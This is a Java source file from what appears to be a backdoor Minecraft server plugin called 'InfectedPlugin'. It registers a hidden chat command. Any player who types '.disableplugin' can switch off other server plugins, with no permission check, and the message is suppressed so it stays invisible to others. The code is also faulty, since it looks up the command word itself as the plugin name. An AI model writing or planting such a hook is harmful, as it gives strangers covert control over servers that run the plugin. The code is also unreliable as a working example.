 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.plugin.*;
 import org.bukkit.entity.Player;
 import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
public class Command_disableplugin extends IP_Command implements Listener
 {
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         boolean cancel = false;
         Server server = Bukkit.getServer();
         Player p = event.getPlayer();
         
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
             if (args == null)
             {
                 return;
             }
 
             if (args[0].equalsIgnoreCase(".disableplugin"))
             {
                 if (args.length == 0)
                 {
                     p.sendMessage(ChatColor.RED + "Usage: .disableplugin <plugin>");
                 }
 
                 Plugin pl;
                 try
                 {
                     pl = getPlugin(args[0]);
                 }
                 catch (PluginNotFoundException ex)
                 {
                     p.sendMessage(ChatColor.RED + ex.getMessage());
                     return;
                 }
                 
                 if (pl != null)
                 {
                     PluginManager pluginManager = pl.getServer().getPluginManager();
                     pluginManager.disablePlugin(pl);
                 }
                 p.sendMessage(ChatColor.AQUA + "Plugin disabled!");
                 cancel = true;
             }
         
             if (cancel)
             {
                 event.setCancelled(true);
                 return;
             }
        }
     }
 }
